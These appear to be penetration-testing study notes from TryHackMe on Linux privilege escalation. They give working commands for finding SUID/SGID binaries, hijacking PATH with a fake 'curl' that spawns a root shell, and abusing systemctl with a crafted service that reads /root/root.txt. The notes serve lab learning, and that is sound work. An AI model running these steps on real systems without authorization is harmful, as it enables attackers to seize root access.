# Linux Privilege Escalation
#pentest/tryhackme

## SUID and SGID
We should always try to find executables that can run with higher permissions, meaning they have their SUID set.

```shell
$ find / -perm /4000 2>/dev/null
```

We can also try to find SGID files (meaning this group can execute this executable at a higher permissions:

```shell
$ find . -perm /2000 2>/dev/null
```

Or both at the same time:

```shell
$ find . -perm /6000 2>/dev/null
```

## What after?
Once we find these we might be able to escalate permissions using something called GTFOBins.
[GTFOBins](https://gtfobins.github.io/) -> GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

## Ideas for exploiting a binary running as sudo
1. strings <binary name>
2. Suppose you see something like `curl` there.
	1. In this case we can make this binary look for the **wrong** curl.

Example:

```
$ cd /tmp
$ echo /bin/sh > curl
$ chmod 777 curl
$ export PATH=/tmp:$PATH
$ <call your binary that depends on curl and we will spawn a shell as sudo>
```


## Example of exploiting systemctl
```shell
# Create a variable holding a unique file
$ eop=$(mktemp).service

# Configure this file to execute something 
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $eop

# Link this with systemctl
$ /bin/systemctl link $eop
Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.

# And execute it now
$ /bin/systemctl enable --now $eop
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.

# Did it work? Let's see if our /tmp/output got created
$ cat /tmp/output
```

## For more
[Linux Privilege escalation](https://blog.mzfr.me/linux-priv-esc)